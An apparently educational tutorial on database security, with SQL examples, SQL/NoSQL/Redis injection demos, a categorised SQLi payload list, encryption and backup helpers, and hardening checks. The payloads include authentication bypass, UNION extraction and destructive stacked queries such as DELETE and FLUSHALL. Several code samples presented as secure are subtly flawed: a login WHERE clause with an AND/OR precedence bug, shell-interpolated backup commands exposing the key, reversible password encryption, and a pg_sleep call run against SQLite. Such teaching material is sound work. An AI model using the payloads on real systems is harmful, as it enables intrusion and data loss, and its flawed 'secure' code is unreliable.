# Database Basics for Security

## Layer Position

```
┌─────────────────────────────────────────────┐
│           Application Layer                  │
│  ┌───────────────────────────────────────┐  │
│  │   Database Client / ORM                │  │
│  ├───────────────────────────────────────┤  │
│  │   SQL Parser / Query Engine            │  │
│  ├───────────────────────────────────────┤  │
│  │   Query Execution Engine               │  │
│  └───────────────────────────────────────┘  │
│           Storage Engine Layer               │
│  ┌───────────────────────────────────────┐  │
│  │   Buffer Pool / Cache                  │  │
│  ├───────────────────────────────────────┤  │
│  │   Transaction Log / WAL                │  │
│  ├───────────────────────────────────────┤  │
│  │   Data Files / On-Disk Storage         │  │
│  └───────────────────────────────────────┘  │
│           Operating System Layer            │
│           Hardware Layer                    │
└─────────────────────────────────────────────┘
```

## Internal Architecture

```
Database Security Ecosystem
│
├── SQL Injection Layer
│   ├── Classic SQLi ─────── Union-based, Boolean-blind
│   ├── Time-based SQLi ──── Response timing analysis
│   ├── Error-based SQLi ─── Information leakage
│   ├── Stacked Queries ──── Multiple statement execution
│   └── Out-of-band SQLi ─── DNS/HTTP exfiltration
│
├── Authentication Layer
│   ├── Username/Password ── Basic credential auth
│   ├── Certificate Auth ──── TLS client certificates
│   ├── Kerberos ──────────── Domain authentication
│   └── IAM Roles ─────────── Cloud identity management
│
├── Authorization Layer
│   ├── Role-Based (RBAC) ── Role permissions
│   ├── Attribute-Based ────── Attribute conditions
│   ├── Row-Level Security ─── Per-row access control
│   └── Column-Level Security ─ Per-column masking
│
├── Encryption Layer
│   ├── At Rest ────────────── AES-256 disk encryption
│   ├── In Transit ─────────── TLS for connections
│   ├── In Use ──────────────── TDE (Transparent Data Encryption)
│   └── Field-Level ─────────── Per-column encryption
│
└── Audit Layer
    ├── Query Logging ──────── All SQL statements
    ├── Access Logging ─────── Connection attempts
    ├── Change Tracking ────── DDL/DML modifications
    └── Alerting ───────────── Anomaly detection
```

## 1. SQL Fundamentals

### Core SQL Commands

```sql
-- Database creation
CREATE DATABASE security_audit;
USE security_audit;

-- Table creation with security considerations
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL UNIQUE,
    email VARCHAR(100) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,  -- Never store plain text
    role ENUM('admin', 'analyst', 'viewer') DEFAULT 'viewer',
    mfa_enabled BOOLEAN DEFAULT FALSE,
    last_login TIMESTAMP NULL,
    failed_attempts INT DEFAULT 0,
    locked_until TIMESTAMP NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE audit_log (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id INT,
    action VARCHAR(50) NOT NULL,
    table_name VARCHAR(50),
    record_id INT,
    old_value JSON,
    new_value JSON,
    ip_address VARCHAR(45),
    user_agent TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Secure data insertion (parameterized)
INSERT INTO users (username, email, password_hash, role)
VALUES (?, ?, ?, ?);

-- Secure data retrieval
SELECT id, username, email, role, last_login
FROM users
WHERE username = ? AND locked_until IS NULL OR locked_until < NOW();

-- Update with audit trail
UPDATE users SET last_login = NOW(), failed_attempts = 0
WHERE id = ?;

-- Aggregation for reporting
SELECT role, COUNT(*) as user_count, MAX(last_login) as last_active
FROM users
GROUP BY role;
```

### SQL Query Patterns

```sql
-- Pagination (avoid OFFSET for large datasets)
SELECT * FROM events
WHERE id > ?
ORDER BY id
LIMIT 50;

-- Window functions for analysis
SELECT
    username,
    action,
    timestamp,
    LAG(timestamp) OVER (PARTITION BY user_id ORDER BY timestamp) as prev_action,
    TIMESTAMPDIFF(SECOND, LAG(timestamp) OVER (PARTITION BY user_id ORDER BY timestamp), timestamp) as seconds_between
FROM audit_log;

-- CTE for complex queries
WITH failed_logins AS (
    SELECT user_id, COUNT(*) as attempts
    FROM audit_log
    WHERE action = 'LOGIN_FAILED'
      AND timestamp > DATE_SUB(NOW(), INTERVAL 24 HOUR)
    GROUP BY user_id
)
SELECT u.username, f.attempts
FROM failed_logins f
JOIN users u ON f.user_id = u.id
WHERE f.attempts > 5;
```

## 2. Database Concepts

### Relationships and Schema Design

```sql
-- One-to-Many: Users -> Audit Logs
CREATE TABLE organizations (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(100) NOT NULL,
    tier ENUM('free', 'pro', 'enterprise') DEFAULT 'free',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Foreign key with cascading
CREATE TABLE projects (
    id INT PRIMARY KEY AUTO_INCREMENT,
    org_id INT NOT NULL,
    name VARCHAR(100) NOT NULL,
    owner_id INT NOT NULL,
    visibility ENUM('private', 'internal', 'public') DEFAULT 'private',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (org_id) REFERENCES organizations(id) ON DELETE CASCADE,
    FOREIGN KEY (owner_id) REFERENCES users(id) ON DELETE RESTRICT
);

-- Many-to-Many: Users -> Projects (access control)
CREATE TABLE project_access (
    user_id INT NOT NULL,
    project_id INT NOT NULL,
    permission ENUM('read', 'write', 'admin') DEFAULT 'read',
    granted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    granted_by INT,
    PRIMARY KEY (user_id, project_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY (project_id) REFERENCES projects(id) ON DELETE CASCADE,
    FOREIGN KEY (granted_by) REFERENCES users(id) ON DELETE SET NULL
);

-- Indexes for performance and security
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_users_username ON users(username);
CREATE INDEX idx_audit_user_action ON audit_log(user_id, action, timestamp);
CREATE INDEX idx_audit_timestamp ON audit_log(timestamp);
```

### Database Normalization (Security Implications)

```sql
-- 1NF: Atomic values (no multi-valued fields)
-- BAD: tags = "admin,user,editor"
-- GOOD: Separate user_roles table

CREATE TABLE user_roles (
    user_id INT NOT NULL,
    role_id INT NOT NULL,
    assigned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id, role_id)
);

-- 2NF: No partial dependencies
-- BAD: user_email stored in audit_log (duplicates data)
-- GOOD: Reference users table via foreign key

-- 3NF: No transitive dependencies
-- BAD: role_name in users table (should be separate roles table)
CREATE TABLE roles (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50) NOT NULL UNIQUE,
    permissions JSON NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## 3. SQL Injection Attacks

### Classic SQLi

```python
import sqlite3
import time
from typing import List, Dict

class SQLiDemo:
    """Demonstrate SQL injection vulnerabilities (for educational purposes)."""

    def __init__(self, db_path: str = ":memory:"):
        self.conn = sqlite3.connect(db_path)
        self._setup_database()

    def _setup_database(self):
        cursor = self.conn.cursor()
        cursor.executescript("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                role TEXT DEFAULT 'user'
            );
            CREATE TABLE secrets (
                id INTEGER PRIMARY KEY,
                user_id INTEGER,
                secret_data TEXT NOT NULL
            );
            INSERT INTO users VALUES (1, 'admin', 'supersecret123', 'admin');
            INSERT INTO users VALUES (2, 'user1', 'password1', 'user');
            INSERT INTO secrets VALUES (1, 1, 'API_KEY: sk-1234567890abcdef');
        """)
        self.conn.commit()

    def vulnerable_query(self, username: str) -> List[Dict]:
        """VULNERABLE: Direct string concatenation."""
        cursor = self.conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}'"
        cursor.execute(query)
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]

    def secure_query(self, username: str) -> List[Dict]:
        """SECURE: Parameterized query."""
        cursor = self.conn.cursor()
        query = "SELECT * FROM users WHERE username = ?"
        cursor.execute(query, (username,))
        columns = [desc[0] for desc in cursor.description]
        return [dict(zip(columns, row)) for row in cursor.fetchall()]

    def demonstrate_attack(self):
        """Show SQL injection attack vectors."""
        print("=== SQL Injection Demonstration ===\n")

        # Attack 1: Authentication bypass
        print("1. Authentication Bypass:")
        payload = "' OR '1'='1"
        print(f"   Payload: {payload}")
        result = self.vulnerable_query(payload)
        print(f"   Result: {len(result)} users returned (should be 0)\n")

        # Attack 2: UNION-based data extraction
        print("2. UNION-based Data Extraction:")
        payload = "' UNION SELECT id, username, password, role FROM users--"
        print(f"   Payload: {payload}")
        result = self.vulnerable_query(payload)
        for row in result:
            print(f"   Found: {row}\n")

        # Attack 3: Stacked queries
        print("3. Stacked Query (DELETE):")
        payload = "'; DELETE FROM users WHERE 1=1--"
        print(f"   Payload: {payload}")
        # In real attack, this would delete all users

        # Show secure version
        print("\n4. Secure Version:")
        result = self.secure_query("' OR '1'='1")
        print(f"   Result: {len(result)} users returned (correct: 0)")

    def time_based_sqli(self, target_char: str = "a") -> bool:
        """Time-based blind SQLi detection."""
        payload = f"' AND CASE WHEN (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='{target_char}' THEN pg_sleep(5) ELSE pg_sleep(0) END--"
        start = time.time()
        self.vulnerable_query(payload)
        elapsed = time.time() - start
        return elapsed > 4.5

    def close(self):
        self.conn.close()
```

### SQLi Payload Reference

```python
SQLI_PAYLOADS = {
    "authentication_bypass": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' OR ''='",
        "1' OR '1'='1'/*",
        "admin') OR ('1'='1",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT username,password FROM users--",
        "1 UNION SELECT table_name FROM information_schema.tables--",
    ],
    "error_based": [
        "' AND 1=CONVERT(int,@@version)--",
        "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
    ],
    "time_based": [
        "' AND SLEEP(5)--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND (SELECT LENGTH(username) FROM users LIMIT 1)>5--",
        "' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>64--",
    ],
}
```

## 4. Prepared Statements

### Secure Query Patterns

```python
import sqlite3
import psycopg2
import pymysql
from typing import Any, List, Dict, Optional

class SecureDatabase:
    """Database wrapper enforcing parameterized queries."""

    def __init__(self, db_type: str = "sqlite", **kwargs):
        self.db_type = db_type
        self.connection = self._connect(**kwargs)
        self.connection.autocommit = False

    def _connect(self, **kwargs):
        if self.db_type == "sqlite":
            return sqlite3.connect(kwargs.get("database", ":memory:"))
        elif self.db_type == "postgresql":
            return psycopg2.connect(**kwargs)
        elif self.db_type == "mysql":
            return pymysql.connect(**kwargs)
        raise ValueError(f"Unsupported database: {self.db_type}")

    def execute(self, query: str, params: tuple = ()) -> List[Dict]:
        """Execute parameterized query safely."""
        cursor = self.connection.cursor()
        try:
            cursor.execute(query, params)
            if cursor.description:
                columns = [desc[0] for desc in cursor.description]
                return [dict(zip(columns, row)) for row in cursor.fetchall()]
            self.connection.commit()
            return []
        except Exception as e:
            self.connection.rollback()
            raise

    def executemany(self, query: str, params_list: List[tuple]) -> int:
        """Execute parameterized query with multiple parameter sets."""
        cursor = self.connection.cursor()
        try:
            cursor.executemany(query, params_list)
            self.connection.commit()
            return cursor.rowcount
        except Exception as e:
            self.connection.rollback()
            raise

    def insert_user(self, username: str, email: str, password_hash: str, role: str = "user") -> int:
        """Insert user with parameterized query."""
        result = self.execute(
            "INSERT INTO users (username, email, password_hash, role) VALUES (?, ?, ?, ?)",
            (username, email, password_hash, role)
        )
        return result

    def find_user(self, username: str) -> Optional[Dict]:
        """Find user by username."""
        results = self.execute(
            "SELECT id, username, email, role FROM users WHERE username = ?",
            (username,)
        )
        return results[0] if results else None

    def search_users(self, search_term: str, role: str = None) -> List[Dict]:
        """Search users with parameterized filtering."""
        if role:
            return self.execute(
                "SELECT id, username, email FROM users WHERE username LIKE ? AND role = ?",
                (f"%{search_term}%", role)
            )
        return self.execute(
            "SELECT id, username, email FROM users WHERE username LIKE ?",
            (f"%{search_term}%",)
        )

    def close(self):
        self.connection.close()
```

### ORM Approach (SQLAlchemy)

```python
from sqlalchemy import create_engine, Column, Integer, String, DateTime, Enum
from sqlalchemy.orm import declarative_base, Session
from sqlalchemy.sql import func

Base = declarative_base()

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True, nullable=False)
    email = Column(String(100), unique=True, nullable=False)
    password_hash = Column(String(255), nullable=False)
    role = Column(Enum("admin", "analyst", "viewer"), default="viewer")
    created_at = Column(DateTime, server_default=func.now())

    def __repr__(self):
        return f"<User(username={self.username}, role={self.role})>"

# Secure queries with ORM
def find_user_secure(session: Session, username: str):
    return session.query(User).filter(User.username == username).first()

def search_users_secure(session: Session, search: str, role: str = None):
    query = session.query(User).filter(User.username.contains(search))
    if role:
        query = query.filter(User.role == role)
    return query.all()

# ORM prevents SQLi by default
# session.query(User).filter(User.username == malicious_input)  # Safe
```

## 5. Database Security

### Access Control

```sql
-- Create roles with minimal privileges
CREATE ROLE 'app_readonly';
CREATE ROLE 'app_readwrite';
CREATE ROLE 'app_admin';

-- Grant specific privileges
GRANT SELECT ON security_audit.users TO 'app_readonly';
GRANT SELECT, INSERT, UPDATE ON security_audit.users TO 'app_readwrite';
GRANT SELECT, INSERT, UPDATE, DELETE ON security_audit.* TO 'app_admin';

-- Revoke dangerous privileges
REVOKE ALL PRIVILEGES ON *.* FROM 'app_readonly';
REVOKE CREATE, DROP, ALTER ON security_audit.* FROM 'app_readwrite';

-- Create application user with minimal access
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password_here';
GRANT SELECT, INSERT, UPDATE ON security_audit.audit_log TO 'app_user'@'localhost';
GRANT SELECT ON security_audit.users TO 'app_user'@'localhost';

-- Row-Level Security (PostgreSQL)
ALTER TABLE projects ENABLE ROW LEVEL SECURITY;

CREATE POLICY user_projects ON projects
    FOR ALL
    USING (owner_id = current_setting('app.user_id')::int);

CREATE POLICY team_projects ON projects
    FOR SELECT
    USING (
        id IN (
            SELECT project_id FROM project_access
            WHERE user_id = current_setting('app.user_id')::int
        )
    );

-- Column masking for sensitive data
CREATE VIEW safe_users AS
SELECT
    id,
    username,
    CONCAT(LEFT(email, 2), '***@', SUBSTRING_INDEX(email, '@', -1)) as masked_email,
    role
FROM users;
```

### Encryption at Rest

```python
import hashlib
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64

class FieldEncryption:
    """Encrypt/decrypt individual database fields."""

    def __init__(self, key: bytes = None):
        if key is None:
            key = Fernet.generate_key()
        self.fernet = Fernet(key)

    def encrypt_field(self, plaintext: str) -> str:
        """Encrypt a field value."""
        return self.fernet.encrypt(plaintext.encode()).decode()

    def decrypt_field(self, ciphertext: str) -> str:
        """Decrypt a field value."""
        return self.fernet.decrypt(ciphertext.encode()).decode()

    def hash_field(self, value: str) -> str:
        """One-way hash for searchable encryption."""
        return hashlib.sha256(value.encode()).hexdigest()

class AESGCMEncryption:
    """AES-GCM authenticated encryption for database fields."""

    def __init__(self, key: bytes = None):
        if key is None:
            key = AESGCM.generate_key(bit_length=256)
        self.aesgcm = AESGCM(key)

    def encrypt(self, plaintext: str) -> dict:
        nonce = os.urandom(12)
        ciphertext = self.aesgcm.encrypt(nonce, plaintext.encode(), None)
        return {
            "nonce": base64.b64encode(nonce).decode(),
            "ciphertext": base64.b64encode(ciphertext).decode()
        }

    def decrypt(self, encrypted: dict) -> str:
        nonce = base64.b64decode(encrypted["nonce"])
        ciphertext = base64.b64decode(encrypted["ciphertext"])
        return self.aesgcm.decrypt(nonce, ciphertext, None).decode()

# Usage
enc = FieldEncryption()
# Encrypt password before storage
encrypted_pw = enc.encrypt_field("user_password")
# Decrypt when needed for authentication
decrypted_pw = enc.decrypt_field(encrypted_pw)
```

### Backup Security

```python
import subprocess
import hashlib
import os
from datetime import datetime
from pathlib import Path

class SecureBackup:
    """Secure database backup management."""

    def __init__(self, backup_dir: str = "/var/backups/db"):
        self.backup_dir = Path(backup_dir)
        self.backup_dir.mkdir(parents=True, exist_ok=True)

    def create_backup(self, db_name: str, db_user: str, db_host: str = "localhost") -> dict:
        """Create encrypted database backup."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_file = self.backup_dir / f"{db_name}_{timestamp}.sql.gz"
        encrypted_file = self.backup_dir / f"{db_name}_{timestamp}.sql.gz.enc"

        # Create compressed backup
        cmd = f"pg_dump -h {db_host} -U {db_user} {db_name} | gzip > {backup_file}"
        subprocess.run(cmd, shell=True, check=True)

        # Calculate checksum
        checksum = self._calculate_checksum(str(backup_file))

        # Encrypt backup
        enc_key = os.environ.get("BACKUP_ENCRYPTION_KEY")
        if enc_key:
            encrypt_cmd = f"openssl enc -aes-256-cbc -salt -in {backup_file} -out {encrypted_file} -k {enc_key}"
            subprocess.run(encrypt_cmd, shell=True, check=True)
            backup_file.unlink()  # Remove unencrypted version

        return {
            "file": str(encrypted_file if enc_key else backup_file),
            "checksum": checksum,
            "timestamp": timestamp,
            "size": os.path.getsize(str(encrypted_file if enc_key else backup_file))
        }

    def verify_backup(self, filepath: str, expected_checksum: str) -> bool:
        """Verify backup integrity."""
        actual_checksum = self._calculate_checksum(filepath)
        return actual_checksum == expected_checksum

    def restore_backup(self, filepath: str, db_name: str, db_user: str, db_host: str = "localhost") -> bool:
        """Restore database from backup."""
        enc_key = os.environ.get("BACKUP_ENCRYPTION_KEY")
        if filepath.endswith(".enc") and enc_key:
            decrypted = filepath.rstrip(".enc")
            decrypt_cmd = f"openssl enc -d -aes-256-cbc -in {filepath} -out {decrypted} -k {enc_key}"
            subprocess.run(decrypt_cmd, shell=True, check=True)
            filepath = decrypted

        cmd = f"gunzip -c {filepath} | psql -h {db_host} -U {db_user} {db_name}"
        result = subprocess.run(cmd, shell=True)
        return result.returncode == 0

    def _calculate_checksum(self, filepath: str) -> str:
        h = hashlib.sha256()
        with open(filepath, "rb") as f:
            while chunk := f.read(8192):
                h.update(chunk)
        return h.hexdigest()
```

## 6. NoSQL Injection

```python
import json
from typing import Any, Dict

class NoSQLInjectionDemo:
    """Demonstrate NoSQL injection vulnerabilities."""

    @staticmethod
    def vulnerable_mongodb_query(user_input: dict) -> dict:
        """VULNERABLE: Direct use of user input in query."""
        # Attack: {"username": {"$gt": ""}, "password": {"$gt": ""}}
        # This bypasses authentication
        query = {
            "username": user_input.get("username"),
            "password": user_input.get("password")
        }
        return query

    @staticmethod
    def secure_mongodb_query(username: str, password: str) -> dict:
        """SECURE: Type validation and sanitization."""
        if not isinstance(username, str) or not isinstance(password, str):
            raise ValueError("Invalid input types")
        if len(username) > 100 or len(password) > 100:
            raise ValueError("Input too long")
        return {"username": username, "password": password}

    @staticmethod
    def detect_nosqli_payload(data: Any) -> bool:
        """Detect NoSQL injection attempts."""
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, dict):
                    if any(k.startswith("$") for k in value.keys()):
                        return True
                if isinstance(value, str):
                    if "$gt" in value or "$ne" in value or "$regex" in value:
                        return True
        return False

    @staticmethod
    def demonstrate_attack():
        print("=== NoSQL Injection Demonstration ===\n")

        # Normal login
        print("1. Normal login attempt:")
        normal_input = {"username": "admin", "password": "secretpass"}
        query = NoSQLInjectionDemo.vulnerable_mongodb_query(normal_input)
        print(f"   Query: {json.dumps(query)}\n")

        # Injection attack
        print("2. NoSQL injection attack:")
        attack_input = {"username": {"$gt": ""}, "password": {"$gt": ""}}
        query = NoSQLInjectionDemo.vulnerable_mongodb_query(attack_input)
        print(f"   Query: {json.dumps(query)}")
        print("   This matches ANY user with ANY password!\n")

        # Detection
        print("3. Detection:")
        detected = NoSQLInjectionDemo.detect_nosqli_payload(attack_input)
        print(f"   Payload detected: {detected}")

        # Secure version
        print("\n4. Secure version:")
        try:
            secure_input = NoSQLInjectionDemo.secure_mongodb_query(
                attack_input["username"], attack_input["password"]
            )
            print(f"   Would fail with: 'Invalid input types'")
        except ValueError as e:
            print(f"   Blocked: {e}")
```

### Redis Injection

```python
class RedisInjectionDemo:
    """Demonstrate Redis command injection."""

    @staticmethod
    def vulnerable_redis_command(user_input: str) -> str:
        """VULNERABLE: Direct string concatenation."""
        return f"GET user:{user_input}"

    @staticmethod
    def demonstrate_attack():
        print("=== Redis Injection Demonstration ===\n")

        # Normal command
        print("1. Normal command:")
        cmd = RedisInjectionDemo.vulnerable_redis_command("alice")
        print(f"   Command: {cmd}\n")

        # Injection attack
        print("2. Redis injection attack:")
        payload = "alice\r\nFLUSHALL\r\nSET admin 1\r\nGET "
        cmd = RedisInjectionDemo.vulnerable_redis_command(payload)
        print(f"   Command: {repr(cmd)}")
        print("   This executes FLUSHALL (deletes all data)!\n")

        # Prevention
        print("3. Prevention: Use parameterized commands")
        print("   redis.get(f'user:{sanitize(user_input)}')")
        print("   Or use Redis SET/GET with proper escaping")
```

## 7. Database Hardening

### Hardening Checklist Script

```python
import json
from typing import List, Dict

class DatabaseHardeningChecker:
    """Check database configuration for security best practices."""

    def __init__(self, db_type: str = "mysql"):
        self.db_type = db_type
        self.checks = []

    def check_default_credentials(self, config: dict) -> Dict:
        """Check for default/generic credentials."""
        default_users = ["root", "admin", "test", "guest", "sa"]
        issues = []
        for user in config.get("users", []):
            if user.get("name") in default_users:
                issues.append(f"Default user found: {user['name']}")
        return {"check": "Default Credentials", "status": "FAIL" if issues else "PASS", "issues": issues}

    def check_encryption(self, config: dict) -> Dict:
        """Check encryption configuration."""
        issues = []
        if not config.get("ssl_enabled"):
            issues.append("SSL/TLS not enabled for connections")
        if not config.get("encryption_at_rest"):
            issues.append("Encryption at rest not enabled")
        if config.get("min_tls_version", "1.0") < "1.2":
            issues.append("TLS version below 1.2")
        return {"check": "Encryption", "status": "FAIL" if issues else "PASS", "issues": issues}

    def check_permissions(self, config: dict) -> Dict:
        """Check user permissions."""
        issues = []
        for user in config.get("users", []):
            if "ALL PRIVILEGES" in user.get("privileges", []):
                issues.append(f"User {user['name']} has ALL PRIVILEGES")
            if user.get("host") == "%":
                issues.append(f"User {user['name']} accessible from any host")
        return {"check": "Permissions", "status": "FAIL" if issues else "PASS", "issues": issues}

    def check_logging(self, config: dict) -> Dict:
        """Check audit logging configuration."""
        issues = []
        if not config.get("general_log"):
            issues.append("General query logging disabled")
        if not config.get("slow_query_log"):
            issues.append("Slow query logging disabled")
        if not config.get("audit_plugin"):
            issues.append("Audit plugin not installed")
        return {"check": "Logging", "status": "FAIL" if issues else "PASS", "issues": issues}

    def run_all_checks(self, config: dict) -> List[Dict]:
        """Run all hardening checks."""
        results = [
            self.check_default_credentials(config),
            self.check_encryption(config),
            self.check_permissions(config),
            self.check_logging(config),
        ]
        self.checks = results
        return results

    def generate_report(self) -> str:
        """Generate hardening report."""
        report = []
        report.append("=" * 60)
        report.append("DATABASE HARDENING REPORT")
        report.append("=" * 60)
        passed = sum(1 for c in self.checks if c["status"] == "PASS")
        failed = sum(1 for c in self.checks if c["status"] == "FAIL")
        report.append(f"\nResults: {passed} passed, {failed} failed\n")
        for check in self.checks:
            status_icon = "✓" if check["status"] == "PASS" else "✗"
            report.append(f"{status_icon} {check['check']}: {check['status']}")
            for issue in check.get("issues", []):
                report.append(f"    - {issue}")
        return "\n".join(report)
```

## Security Perspective

| Aspect | Detail |
|--------|--------|
| Parameterized Queries | Always use prepared statements |
| Least Privilege | Grant minimum necessary database permissions |
| Encryption | TLS in transit, AES at rest |
| Audit Logging | Log all queries and access attempts |
| Input Validation | Validate types, length, and format |
| Backup Security | Encrypt backups, verify integrity |

## Attack Techniques and Defenses

| Attack | Technique | Defense |
|--------|-----------|---------|
| Classic SQLi | Inject SQL via user input | Parameterized queries |
| Blind SQLi | Infer data from response timing | WAF, parameterized queries |
| UNION SQLi | Extract data via UNION SELECT | Limit query results |
| NoSQL Injection | Inject operators ($gt, $ne) | Type validation |
| Command Injection | Execute OS commands via DB | Disable xp_cmdshell, UDFs |
| Privilege Escalation | Expit DB permissions | Role-based access control |
| Data Exfiltration | Export data via queries | Query monitoring, data masking |
| Backup Theft | Steal unencrypted backups | Encrypt backups, access control |

## Debugging Tools

| Tool | Purpose |
|------|---------|
| `EXPLAIN` / `EXPLAIN ANALYZE` | Query execution plan |
| `SHOW PROCESSLIST` | Active queries |
| `SHOW VARIABLES` | Configuration inspection |
| `mysqltuner` | Performance and security tuning |
| `pgBadger` | PostgreSQL log analyzer |
| `SQLMap` | SQL injection testing (authorized use) |
| `DBeaver` | Database GUI for inspection |

## Interview Questions

1. What is the difference between SQL injection and NoSQL injection?
2. How do prepared statements prevent SQL injection?
3. Explain the principle of least privilege for database users.
4. What is column-level encryption and when should you use it?
5. How would you detect SQL injection attempts in production logs?
6. What are the risks of database connection pooling?
7. Explain row-level security and its use cases.
8. How do you securely store database credentials in an application?
9. What is the difference between symmetric and asymmetric encryption for database fields?
10. How would you design a database audit logging system?

## Hands-on Labs

### Lab 1: SQL Injection Exploitation
```python
# Task: Exploit SQL injection vulnerabilities
# Requirements:
# 1. Test authentication bypass
# 2. Extract data using UNION-based SQLi
# 3. Perform blind SQLi with boolean conditions
# 4. Use time-based SQLi for data extraction
# 5. Write secure parameterized queries
```

### Lab 2: Database Hardening
```python
# Task: Harden a database installation
# Requirements:
# 1. Remove default users and credentials
# 2. Configure TLS for connections
# 3. Implement role-based access control
# 4. Enable audit logging
# 5. Set up encrypted backups
```

### Lab 3: Secure Application Design
```python
# Task: Build a secure database layer
# Requirements:
# 1. Implement parameterized query wrapper
# 2. Add field-level encryption for PII
# 3. Create audit logging trigger
# 4. Implement connection pooling with security
# 5. Write automated security tests
```

## Summary Table

| Category | Tools/Techniques | Security Impact |
|----------|-----------------|-----------------|
| SQL | Prepared statements, ORM | SQL injection prevention |
| Access Control | RBAC, Row-level security | Unauthorized access prevention |
| Encryption | TLS, AES, Fernet | Data confidentiality |
| Auditing | Query logs, triggers | Compliance, forensics |
| Hardening | Config checks, patching | Attack surface reduction |
| Backups | Encrypted, verified | Data recovery |
| Monitoring | Query analysis, alerts | Anomaly detection |
